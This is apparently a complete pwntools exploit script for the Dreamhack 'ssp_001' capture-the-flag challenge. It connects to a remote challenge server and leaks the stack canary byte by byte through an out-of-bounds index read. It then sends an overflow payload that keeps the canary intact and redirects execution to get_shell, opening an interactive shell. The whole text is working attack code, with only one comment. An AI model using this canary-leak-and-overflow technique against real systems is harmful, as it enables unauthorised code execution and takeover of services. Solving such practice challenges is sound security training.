from pwn import *
context.log_level = 'debug'
#p = process("./ssp_001")
p = remote("host1.dreamhack.games", 9440)
e = ELF("./ssp_001")
get_shell = e.symbols["get_shell"]
CANARY = ''
for i in range(0, 4):
    p.recvuntil("> ")
    p.sendline("P")
    p.recvuntil("Element index : ")
    p.sendline(str(128 + (3 - i))) #Canary is stored by little endian formate. 
    p.recvuntil("is : ")
    CANARY += p.recv(2)

Canary_int = int(CANARY, 16)
payload = 'A' * 0x40
payload += p32(Canary_int)
payload += 'a' * 0x8
payload += p32(get_shell)

p.recvuntil("> ")
p.sendline("E")
p.recvuntil("Name Size : ")
p.sendline(str(0x400))
p.recvuntil("Name : ")
p.sendline(payload)
p.interactive()